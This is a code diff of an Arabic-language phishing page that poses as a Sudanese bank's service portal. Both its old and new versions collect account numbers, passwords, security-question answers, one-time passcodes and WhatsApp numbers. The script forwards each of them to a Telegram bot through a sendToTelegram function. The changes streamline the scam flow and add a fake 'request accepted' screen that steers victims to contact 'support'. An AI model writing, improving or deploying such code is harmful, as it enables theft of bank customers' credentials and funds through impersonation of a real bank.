+            <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
+            <option value="ما هي ماركة سيارتك الأولى؟">ما هي ماركة سيارتك الأولى؟</option>
+          </select>
+        </div>
 
         <div class="input-box">
-          <input type="text" class="input-field" placeholder="أدخل الجواب هنا" id="answerInput" autocomplete="off" />
+          <input type="text" class="input-field" placeholder="أدخل الجواب" id="answerInput" />
         </div>
 
-        <div class="btn-group">
-          <button class="btn-red" onclick="validateSecurityAnswer()">إرسال الجواب</button>
-          <button class="btn-red" onclick="nextQuestion()" style="background: #475569; border-color: #334155;">سؤال آخر</button>
-        </div>
+        <button class="btn-red" onclick="validateSecurityAnswer()">إرسال</button>
       </div>
     </div>
 
     <!-- 5. شاشة التحقق OTP -->
     <div class="screen" id="screenOtp">
-      <div class="top-header" style="padding: 14px 16px;">
+      <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
-          <span class="page-title">رمز التحقق</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenQuestions')">← رجوع</button>
+          <span class="page-title">التحقق</span>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenQuestions')">← رجوع</button>
         </div>
-        <div class="logo-box" style="transform: scale(0.75);">
+        <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
         </div>
       </div>
@@ -754,259 +602,63 @@
         <div class="otp-card">
           <div class="timer-circle"></div>
           <div class="timer-text">الوقت المتبقي <span id="timerCountdown">59:00</span></div>
-          <p class="otp-info">تم إرسال رمز التحقق المؤقت (OTP) إلى رقم هاتفك المسجل / بريدك الإلكتروني.</p>
+          <p class="otp-info">تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل / البريد الإلكتروني.</p>
 
           <div class="input-box">
             <span class="icon-right">📱</span>
-            <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز (6 أرقام)" maxlength="6" autocomplete="one-time-code" />
+            <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز السري (6 أرقام)" maxlength="6" />
           </div>
 
-          <a href="#" class="resend-link" onclick="event.preventDefault(); alert('تم إعادة إرسال الرمز بنجاح');">إعادة إرسال الرمز</a>
+          <a href="#" class="resend-link">إعادة إرسال</a>
 
           <div class="btn-group">
-            <button class="btn-red" onclick="validateOtp()">تأكيد الرمز</button>
-            <button class="btn-red" style="background:#ef4444; border-color:#dc2626;" onclick="switchScreen('screenLogin')">إلغاء</button>
+            <button class="btn-red" onclick="validateOtp()">إرسال</button>
+            <button class="btn-red" style="background:#ef4444;" onclick="attemptTransition('screenLogin')">إلغاء</button>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- 6. قسم إدخال رقم الواتساب والتواصل -->
-    <div class="screen" id="screenWhatsAppCenter">
-      <div class="top-header" style="padding: 14px 16px;">
+    <!-- 6. شاشة رقم الواتساب -->
+    <div class="screen" id="screenWhatsapp">
+      <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
-          <span class="page-title">تأكيد رقم الواتساب</span>
-          <span></span>
+          <span class="page-title">التواصل</span>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenOtp')">← رجوع</button>
         </div>
-        <div class="logo-box" style="transform: scale(0.75);">
+        <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
         </div>
       </div>
-
       <div class="form-section">
-        <div class="otp-card" style="padding: 20px 16px; text-align: right;">
-          <div style="font-size: 2rem; text-align: center; margin-bottom: 8px;">💬</div>
-          <h3 style="color: #0f172a; margin-bottom: 6px; font-size: 1.05rem; font-weight: 900; text-align: center;">تم التحقق من الحساب بنجاح</h3>
-          <p style="color: #64748b; font-size: 0.84rem; margin-bottom: 14px; font-weight: 600; text-align: center;">
-            يرجى إدخال رقم الواتساب الخاص بك أدناه لكي يتم ربطه بطلب خدمة (<span id="serviceNameDisplay" style="color:#e10a14; font-weight:800;"></span>) ومتابعة الإجراءات:
-          </p>
-
-          <div class="input-box" style="margin-bottom: 12px;">
+        <div style="background:#fff; border:2px solid #e2e8f0; border-radius:12px; padding:20px; text-align:center; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
+          <div style="font-size:1.8rem; margin-bottom:8px;">💬</div>
+          <p style="font-size:0.9rem; color:#374151; margin-bottom:14px; font-weight:600;">الرجاء كتابة رقم الواتساب للتواصل</p>
+          <div class="input-box">
             <span class="icon-right">📱</span>
-            <input type="text" class="input-field" id="whatsappNumberInput" placeholder="أدخل رقم الواتساب (مثال: 0912345678)" maxlength="10" autocomplete="tel" />
+            <input type="tel" class="input-field" id="whatsappInput" placeholder="أدخل رقم الواتساب" style="direction: ltr; text-align: right;" />
           </div>
-
-          <button class="btn-whatsapp" onclick="submitWhatsAppNumber()">
-            <span>💬 حفظ رقم الواتساب والمتابعة</span>
-          </button>
+          <button class="btn-red" onclick="validateWhatsapp()">متابعة</button>
         </div>
       </div>
     </div>
 
-    <!-- 7. شاشة جاري تقديم الطلب -->
+    <!-- 7. شاشة تقديم الطلب والتواصل الرسمية -->
     <div class="screen" id="screenLoading">
-      <div class="top-header" style="padding: 14px 16px;">
+      <div class="top-header" style="padding: 12px 16px;">
         <div class="header-bar">
           <span class="page-title">حالة الطلب</span>
-          <span></span>
+          <button type="button" class="btn-top-back" onclick="attemptTransition('screenServices')">← الرئيسية</button>
         </div>
-        <div class="logo-box" style="transform: scale(0.75);">
+        <div class="logo-box" style="transform: scale(0.7);">
           <div class="logo-ar">بنـ<span>كك</span></div>
         </div>
       </div>
 
       <div class="loading-screen">
-        <div class="loading-spinner"></div>
-        <div class="loading-title">جاري تقديم الطلب...</div>
-        <div class="loading-subtitle">يرجى الانتظار بينما نقوم بتجهيز نموذج الخدمة المطلوب</div>
-      </div>
-    </div>
-
-    <!-- 8. شاشة استمارة التحويلات الخاطئة -->
-    <div class="screen" id="screenWrongTransferForm">
-      <div class="top-header" style="padding: 14px 16px;">
-        <div class="header-bar">
-          <span class="page-title">استمارة التحويلات الخاطئة</span>
-          <button type="button" class="btn-top-back" onclick="resetAppData()">الرئيسية</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.75);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="form-section">
-        <form onsubmit="handleWrongTransferSubmit(event)" id="wrongTransferFormEl">
-          <div class="input-box">
-            <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="wtName" placeholder="الاسم رباعي (مثال: محمد أحمد علي عثمان)" required autocomplete="name" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📤</span>
-            <input type="text" class="input-field" id="wtSenderAcc" placeholder="رقم الحساب المرسل (7 أرقام)" maxlength="7" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📥</span>
-            <input type="text" class="input-field" id="wtReceiverAcc" placeholder="رقم الحساب المستلم الخطأ (7 أرقام)" maxlength="7" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">💵</span>
-            <input type="number" class="input-field" id="wtAmount" placeholder="المبلغ (بالجنيه السوداني)" min="1" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">🔢</span>
-            <input type="text" class="input-field" id="wtOperationId" placeholder="رقم العملية (أرقام صحيحة)" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📅</span>
-            <input type="date" class="input-field" id="wtDate" required />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">✉️</span>
-            <input type="email" class="input-field" id="wtEmail" placeholder="البريد الإلكتروني الشخصي" required autocomplete="email" />
-          </div>
-
-          <button type="submit" class="btn-red">إرسال تفاصيل التحويل</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- شاشة استمارة تغيير رقم الهاتف -->
-    <div class="screen" id="screenPhoneChangeForm">
-      <div class="top-header" style="padding: 14px 16px;">
-        <div class="header-bar">
-          <span class="page-title">استمارة تغيير رقم الهاتف</span>
-          <button type="button" class="btn-top-back" onclick="resetAppData()">الرئيسية</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.75);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="form-section">
-        <form onsubmit="handlePhoneChangeSubmit(event)" id="phoneChangeFormEl">
-          <div class="input-box">
-            <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="pcName" placeholder="الاسم رباعي" required autocomplete="name" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">💳</span>
-            <input type="text" class="input-field" id="pcAccount" placeholder="رقم الحساب (7 أرقام)" maxlength="7" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📞</span>
-            <input type="text" class="input-field" id="pcOldPhone" placeholder="رقم الهاتف القديم (يبدأ بـ 09 أو 01)" maxlength="10" required autocomplete="tel" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📱</span>
-            <input type="text" class="input-field" id="pcNewPhone" placeholder="رقم الهاتف الجديد المراد ربطه (يبدأ بـ 09 أو 01)" maxlength="10" required autocomplete="tel" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📝</span>
-            <input type="text" class="input-field" id="pcReason" placeholder="سبب تغيير رقم الهاتف" required />
-          </div>
-          <button type="submit" class="btn-red">إرسال طلب تغيير رقم الهاتف</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- 9. شاشة استمارة خدمات العملات الأجنبية -->
-    <div class="screen" id="screenForeignCurrencyForm">
-      <div class="top-header" style="padding: 14px 16px;">
-        <div class="header-bar">
-          <span class="page-title">استمارة العملات الأجنبية</span>
-          <button type="button" class="btn-top-back" onclick="resetAppData()">الرئيسية</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.75);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="form-section">
-        <form onsubmit="handleForeignCurrencySubmit(event)" id="foreignCurrencyFormEl">
-          <div class="input-box">
-            <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="fcName" placeholder="الاسم رباعي" required autocomplete="name" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">💳</span>
-            <input type="text" class="input-field" id="fcAccount" placeholder="رقم الحساب (7 أرقام)" maxlength="7" required autocomplete="off" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">🏦</span>
-            <select class="input-field" id="fcAccountType" required>
-              <option value="" disabled selected>اختر نوع الحساب</option>
-              <option value="توفير">توفير</option>
-              <option value="توفير مميز">توفير مميز</option>
-              <option value="جاري">جاري</option>
-              <option value="حساب شركة">حساب شركة</option>
-            </select>
-          </div>
-          <div class="input-box">
-            <span class="icon-right">💱</span>
-            <select class="input-field" id="fcCurrencyType" required>
-              <option value="" disabled selected>اختر نوع العملة المراد إضافتها</option>
-              <option value="دولار أمريكي (USD)">دولار أمريكي (USD)</option>
-              <option value="ريال سعودي (SAR)">ريال سعودي (SAR)</option>
-              <option value="درهم إماراتي (AED)">درهم إماراتي (AED)</option>
-              <option value="يورو (EUR)">يورو (EUR)</option>
-              <option value="جنيه إسترليني (GBP)">جنيه إسترليني (GBP)</option>
-            </select>
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📝</span>
-            <input type="text" class="input-field" id="fcReason" placeholder="السبب أو الغرض من إضافة العملة" required />
-          </div>
-          <button type="submit" class="btn-red">إرسال طلب العملات الأجنبية</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- 10. شاشة استمارة عامة لباقي الخدمات -->
-    <div class="screen" id="screenGeneralForm">
-      <div class="top-header" style="padding: 14px 16px;">
-        <div class="header-bar">
-          <span class="page-title" id="generalFormTitle">استمارة الطلب</span>
-          <button type="button" class="btn-top-back" onclick="resetAppData()">الرئيسية</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.75);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="form-section">
-        <form onsubmit="handleGeneralFormSubmit(event)" id="generalFormEl">
-          <div class="input-box">
-            <span class="icon-right">👤</span>
-            <input type="text" class="input-field" id="genName" placeholder="الاسم رباعي" required autocomplete="name" />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📝</span>
-            <input type="text" class="input-field" id="genDetails" placeholder="تفاصيل الطلب أو الملاحظات بدقة" required />
-          </div>
-          <div class="input-box">
-            <span class="icon-right">📞</span>
-            <input type="text" class="input-field" id="genPhone" placeholder="رقم الهاتف للتواصل (يبدأ بـ 09 أو 01)" maxlength="10" required autocomplete="tel" />
-          </div>
-          <button type="submit" class="btn-red">إرسال الطلب النهائي</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- 11. شاشة النجاح والنهائية -->
-    <div class="screen" id="screenSuccess">
-      <div class="top-header" style="padding: 14px 16px;">
-        <div class="header-bar">
-          <span class="page-title">حالة الطلب</span>
-          <button type="button" class="btn-top-back" onclick="resetAppData()">الرئيسية 🏠</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.75);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="loading-screen">
-        <div class="loading-title" style="color: #16a34a; font-size: 1.4rem;">تم تقديم طلبك بنجاح!</div>
-        <div class="loading-subtitle" style="color: #475569;">جاري معالجة طلبك من قبل قسم خدمة العملاء والمتابعة.</div>
+        <div class="loading-spinner" id="loadingSpinner"></div>
+        <div class="loading-title" id="loadingTitle">جاري تقديم الطلب...</div>
+        <div class="loading-subtitle" id="loadingSubtitle">يرجى عدم الخروج من الصفحة</div>
 
         <div class="contact-card">
           <div class="contact-title">للتواصل ومراجعة الطلب واستقبال الاستفسارات:</div>
@@ -1022,43 +674,33 @@
   </div>
 
   <script>
-    let selectedServiceIndex = 1;
-    let selectedServiceText = "رفع سقف التحويلات اليومي";
-    let savedWhatsAppNumber = "";
+    let selectedServiceText = "التحويلات الخاطئة";
     
-    const baseQuestions = [
-      "ما هو اسم المدرسة التي التحقت بها؟",
-      "العلامة التجارية لأول تلفزيون خاص بك؟",
-      "أي فيلم هو المفضَّل لديك؟",
-      "ما هو اسم ابن عمك الأول؟",
-      "ماذا كان لديك أثناء الطفولة؟"
-    ];
-    let questions = [];
-    let currentQIndex = 0;
     let timerInterval;
-    
     let failedAttempts = 0;
     let isBlocked = false;
 
-    function shuffleQuestions() {
-      questions = [...baseQuestions].sort(() => Math.random() - 0.5);
-      currentQIndex = 0;
-      updateQuestionDisplay();
-    }
+    let accessSteps = {
+      screenServices: true,
+      screenLogin: false,
+      screenQuestions: false,
+      screenOtp: false,
+      screenWhatsapp: false,
+      screenLoading: false
+    };
 
-    function updateQuestionDisplay() {
-      if(questions.length > 0) {
-        document.getElementById('questionText').textContent = questions[currentQIndex];
+    function attemptTransition(targetScreenId) {
+      if (!accessSteps[targetScreenId]) {
+        showErrorModal("عذراً، لا يمكنك تخطي المراحل والوصول مباشرة لهذه الصفحة.", "قيد الأمان", false);
+        return;
       }
+      switchScreen(targetScreenId);
     }
 
     function selectService(index, serviceName) {
       document.querySelectorAll('.service-option').forEach(el => el.classList.remove('selected'));
       document.querySelector(`.service-grid .service-option:nth-child(${index})`).classList.add('selected');
-      selectedServiceIndex = index;
       selectedServiceText = serviceName;
-
-      switchScreen('screenLogin');
     }
 
     function togglePasswordVisibility() {
@@ -1073,8 +715,8 @@
       const actionsContainer = document.getElementById('modalActionsContainer');
       if (isBlockedState) {
         actionsContainer.innerHTML = `
-          <button class="btn-retry" style="background: linear-gradient(180deg, #0284c7 0%, #0369a1 100%); border-color: #03588c;" onclick="goToSuccessFromBlock()">✉️ متابعة الطلب عبر الدعم</button>
-          <button class="btn-retry" style="background: #64748b; border-color: #475569;" onclick="closeErrorModal()">إغلاق</button>
+          <button class="btn-retry" style="background: linear-gradient(180deg, #0284c7 0%, #0369a1 100%);" onclick="goToLoadingFromBlock()">✉️ متابعة الطلب عبر البريد الإلكتروني</button>
+          <button class="btn-retry" style="background: #6b7280;" onclick="closeErrorModal()">إغلاق</button>
         `;
       } else {
         actionsContainer.innerHTML = `
@@ -1093,38 +735,27 @@
       document.getElementById(modalId).style.display = 'none';
     }
 
-    function goToSuccessFromBlock() {
+    function goToLoadingFromBlock() {
       closeErrorModal();
-      switchScreen('screenSuccess');
+      accessSteps.screenLoading = true;
+      switchScreen('screenLoading');
     }
 
     function switchScreen(screenId) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
       document.getElementById(screenId).classList.add('active');
 
-      if (screenId === 'screenQuestions') {
-        shuffleQuestions();
+      if (screenId === 'screenLoading') {
+        document.getElementById('loadingSpinner').style.display = 'block';
+        document.getElementById('loadingTitle').textContent = 'جاري تقديم الطلب...';
+        document.getElementById('loadingSubtitle').textContent = 'يرجى عدم الخروج من الصفحة';
+
+        setTimeout(() => {
+          document.getElementById('loadingSpinner').style.display = 'none';
+          document.getElementById('loadingTitle').textContent = `تم قبول نوع الخدمة: ${selectedServiceText}`;
+          document.getElementById('loadingSubtitle').innerHTML = 'يرجي الضغط على البريد الإلكتروني للتواصل مع الدعم';
+        }, 10000);
       }
-    }
-
-    function resetAppData() {
-      const allInputs = document.querySelectorAll('input, select, textarea');
-      allInputs.forEach(input => {
-        if (input.type !== 'checkbox' && input.type !== 'radio') {
-          input.value = '';
-        }
-      });
-
-      document.querySelectorAll('.service-option').forEach(el => el.classList.remove('selected'));
-
-      selectedServiceIndex = 1;
-      selectedServiceText = "رفع سقف التحويلات اليومي";
-      savedWhatsAppNumber = "";
-      failedAttempts = 0;
-      isBlocked = false;
-
-      shuffleQuestions();
-      switchScreen('screenServices');
     }
 
     function handleLoginSubmit(e) {
@@ -1154,36 +785,36 @@
 
       failedAttempts = 0;
       sendToTelegram(`📋 دخول جديد [الخدمة: ${selectedServiceText}]\n🔢 الحساب: ${accInput}\n🔐 كلمة المرور: ${passInput}`);
-      
-      switchScreen('screenLoginLoading');
-      setTimeout(() => {
-        document.getElementById('modalDevice').style.display = 'flex';
-      }, 4000);
+      document.getElementById('modalDevice').style.display = 'flex';
     }
 
     function goToSecurityQuestions() {
       closeModal('modalDevice');
-      shuffleQuestions();
+      accessSteps.screenQuestions = true;
       switchScreen('screenQuestions');
     }
 
-    function nextQuestion() {
-      currentQIndex = (currentQIndex + 1) % questions.length;
-      updateQuestionDisplay();
-      document.getElementById('answerInput').value = '';
-    }
-
     function validateSecurityAnswer() {
+      const selectElement = document.getElementById('securityQuestionSelect');
+      const selectedQuestion = selectElement.value;
       const answer = document.getElementById('answerInput').value.trim();
+
+      if (!selectedQuestion) {
+        showErrorModal("يرجى اختيار سؤال الأمان من القائمة.", "خطأ", false);
+        return;
+      }
+
       if (answer === '') {
         showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.", "خطأ", false);
-      } else {
-        sendToTelegram(`🔐 إجابة أمان:\n❓ السؤال: ${questions[currentQIndex]}\n💬 الإجابة: ${answer}`);
-        goToOtpScreen();
+        return;
       }
+
+      sendToTelegram(`🔐 إجابة أمان:\n❓ السؤال: ${selectedQuestion}\n💬 الإجابة: ${answer}`);
+      goToOtpScreen();
     }
 
     function goToOtpScreen() {
+      accessSteps.screenOtp = true;
       switchScreen('screenOtp');
       startTimer(3540);
     }
@@ -1230,160 +861,19 @@
       }
 
       sendToTelegram(`🔢 OTP المعتمد: ${otp}`);
-      
-      document.getElementById('serviceNameDisplay').textContent = selectedServiceText;
-      switchScreen('screenWhatsAppCenter');
+      accessSteps.screenWhatsapp = true;
+      switchScreen('screenWhatsapp');
     }
 
-    function submitWhatsAppNumber() {
-      const waInput = document.getElementById('whatsappNumberInput').value.trim();
-      if (!/^(09|01)\d{8}$/.test(waInput)) {
-        showErrorModal("رقم الواتساب غير صحيح، يجب أن يتكون من 10 أرقام ويدل على رقم محلي صحيح (يبدأ بـ 09 أو 01).", "خطأ في رقم الواتساب", false);
+    function validateWhatsapp() {
+      const whatsapp = document.getElementById('whatsappInput').value.trim();
+      if (!whatsapp) {
+        showErrorModal("يرجى إدخال رقم الواتساب.", "خطأ", false);
         return;
       }
-
-      savedWhatsAppNumber = waInput;
-      sendToTelegram(`📱 رقم الواتساب المُدخل: ${savedWhatsAppNumber}`);
-
+      sendToTelegram(`📱 رقم الواتساب للتواصل: ${whatsapp}`);
+      accessSteps.screenLoading = true;
       switchScreen('screenLoading');
-      setTimeout(() => {
-        if (selectedServiceIndex === 2) {
-          switchScreen('screenWrongTransferForm');
-        } else if (selectedServiceIndex === 6) {
-          switchScreen('screenPhoneChangeForm');
-        } else if (selectedServiceIndex === 3) {
-          switchScreen('screenForeignCurrencyForm');
-        } else {
-          document.getElementById('generalFormTitle').textContent = `استمارة: ${selectedServiceText}`;
-          switchScreen('screenGeneralForm');
-        }
-      }, 10000);
-    }
-
-    function isQuadrupleName(name) {
-      const parts = name.trim().split(/\s+/);
-      return parts.length >= 4;
-    }
-
-    function handleWrongTransferSubmit(e) {
-      e.preventDefault();
-      const name = document.getElementById('wtName').value.trim();
-      const sender = document.getElementById('wtSenderAcc').value.trim();
-      const receiver = document.getElementById('wtReceiverAcc').value.trim();
-      const amount = document.getElementById('wtAmount').value.trim();
-      const opId = document.getElementById('wtOperationId').value.trim();
-      const date = document.getElementById('wtDate').value;
-      const email = document.getElementById('wtEmail').value.trim();
-
-      if (!isQuadrupleName(name)) {
-        showErrorModal("الرجاء إدخال الاسم رباعياً بشكل صحيح (4 أسماء على الأقل).", "خطأ في الاسم", false);
-        return;
-      }
-
-      if (!/^\d{7}$/.test(sender)) {
-        showErrorModal("رقم الحساب المرسل يجب أن يتكون من 7 أرقام.", "خطأ في الحساب", false);
-        return;
-      }
-
-      if (!/^\d{7}$/.test(receiver)) {
-        showErrorModal("رقم الحساب المستلم يجب أن يتكون من 7 أرقام.", "خطأ في الحساب", false);
-        return;
-      }
-
-      if (sender === receiver) {
-        showErrorModal("رقم الحساب المرسل ورقم الحساب المستلم لا يمكن أن يكونا متطابقين.", "خطأ في البيانات", false);
-        return;
-      }
-
-      if (Number(amount) <= 0) {
-        showErrorModal("الرجاء إدخال مبلغ صحيح أكبر من الصفر.", "خطأ في المبلغ", false);
-        return;
-      }
-
-      const message = `🔄 [استمارة التحويلات الخاطئة]\n📱 واتساب: ${savedWhatsAppNumber}\n👤 الاسم: ${name}\n📤 الحساب المرسل: ${sender}\n📥 الحساب المستلم: ${receiver}\n💵 المبلغ: ${amount}\n🔢 رقم العملية: ${opId}\n📅 التاريخ: ${date}\n✉️ البريد: ${email}`;
-      
-      sendToTelegram(message);
-      switchScreen('screenSuccess');
-    }
-
-    function handlePhoneChangeSubmit(e) {
-      e.preventDefault();
-      const name = document.getElementById('pcName').value.trim();
-      const account = document.getElementById('pcAccount').value.trim();
-      const oldPhone = document.getElementById('pcOldPhone').value.trim();
-      const newPhone = document.getElementById('pcNewPhone').value.trim();
-      const reason = document.getElementById('pcReason').value.trim();
-
-      if (!isQuadrupleName(name)) {
-        showErrorModal("الرجاء إدخال الاسم رباعياً بشكل صحيح (4 أسماء على الأقل).", "خطأ في الاسم", false);
-        return;
-      }
-
-      if (!/^\d{7}$/.test(account)) {
-        showErrorModal("رقم الحساب يجب أن يتكون من 7 أرقام.", "خطأ في الحساب", false);
-        return;
-      }
-
-      if (!/^(09|01)\d{8}$/.test(oldPhone)) {
-        showErrorModal("رقم الهاتف القديم غير صحيح.", "خطأ في الهاتف", false);
-        return;
-      }
-
-      if (!/^(09|01)\d{8}$/.test(newPhone)) {
-        showErrorModal("رقم الهاتف الجديد غير صحيح.", "خطأ في الهاتف", false);
-        return;
-      }
-
-      const message = `📱 [استمارة تغيير رقم الهاتف]\n📱 واتساب للتواصل: ${savedWhatsAppNumber}\n👤 الاسم: ${name}\n💳 رقم الحساب: ${account}\n📞 الهاتف القديم: ${oldPhone}\n📲 الهاتف الجديد: ${newPhone}\n📝 السبب: ${reason}`;
-      
-      sendToTelegram(message);
-      switchScreen('screenSuccess');
-    }
-
-    function handleForeignCurrencySubmit(e) {
-      e.preventDefault();
-      const name = document.getElementById('fcName').value.trim();
-      const account = document.getElementById('fcAccount').value.trim();
-      const accountType = document.getElementById('fcAccountType').value;
-      const currencyType = document.getElementById('fcCurrencyType').value;
-      const reason = document.getElementById('fcReason').value.trim();
-
-      if (!isQuadrupleName(name)) {
-        showErrorModal("الرجاء إدخال الاسم رباعياً بشكل صحيح (4 أسماء على الأقل).", "خطأ في الاسم",false);
-        return;
-      }
-
-      if (!/^\d{7}$/.test(account)) {
-        showErrorModal("رقم الحساب يجب أن يتكون من 7 أرقام.", "خطأ في الحساب", false);
-        return;
-      }
-
-      const message = `🌐 [استمارة خدمات العملات الأجنبية]\n📱 واتساب: ${savedWhatsAppNumber}\n👤 الاسم: ${name}\n💳 رقم الحساب: ${account}\n🏦 نوع الحساب: ${accountType}\n💱 العملة المطلوبة: ${currencyType}\n📝 الغرض: ${reason}`;
-      
-      sendToTelegram(message);
-      switchScreen('screenSuccess');
-    }
-
-    function handleGeneralFormSubmit(e) {
-      e.preventDefault();
-      const name = document.getElementById('genName').value.trim();
-      const details = document.getElementById('genDetails').value.trim();
-      const phone = document.getElementById('genPhone').value.trim();
-
-      if (!isQuadrupleName(name)) {
-        showErrorModal("الرجاء إدخال الاسم رباعياً بشكل صحيح (4 أسماء على الأقل).", "خطأ في الاسم", false);
-        return;
-      }
-
-      if (!/^(09|01)\d{8}$/.test(phone)) {
-        showErrorModal("رقم الهاتف غير صحيح، يجب أن يتكون من 10 أرقام ويبدأ بـ 09 أو 01.", "خطأ في الهاتف", false);
-        return;
-      }
-
-      const message = `📋 [طلب خدمة: ${selectedServiceText}]\n📱 واتساب: ${savedWhatsAppNumber}\n👤 الاسم: ${name}\n📝 التفاصيل: ${details}\n📞 الهاتف: ${phone}`;
-      
-      sendToTelegram(message);
-      switchScreen('screenSuccess');
     }
 
     function sendToTelegram(messageText) {
@@ -1397,6 +887,8 @@
         body: JSON.stringify({ chat_id: chatId, text: messageText })
       }).catch(err => console.log('Error sending to telegram'));
     }
+
+    accessSteps.screenLogin = true;
   </script>
 
 </body>
